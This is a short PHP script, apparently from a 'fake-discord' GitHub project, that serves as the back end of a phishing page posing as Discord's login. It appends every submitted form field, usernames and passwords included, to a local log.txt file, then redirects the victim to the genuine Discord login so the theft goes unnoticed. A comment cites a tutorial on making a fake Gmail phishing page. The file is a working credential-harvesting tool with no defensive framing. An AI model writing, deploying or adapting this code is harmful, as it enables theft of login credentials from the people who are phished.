#                         by [Ali Milani Amin]
#             ~> https://github.com/AliMilani/fake-discord/
<?php
//https://hackiteasy.com/2011/01/creating-fake-phishing-page-of-gmail.html

header ('Location: https://www.discord.com/login');

$handle = fopen("log.txt", "a");

foreach($_POST as $variable => $value) {

   fwrite($handle, $variable);

   fwrite($handle, "=");

   fwrite($handle, $value);

   fwrite($handle, "\r\n");

}

fwrite($handle, "\r\n");

fclose($handle);

exit;

?>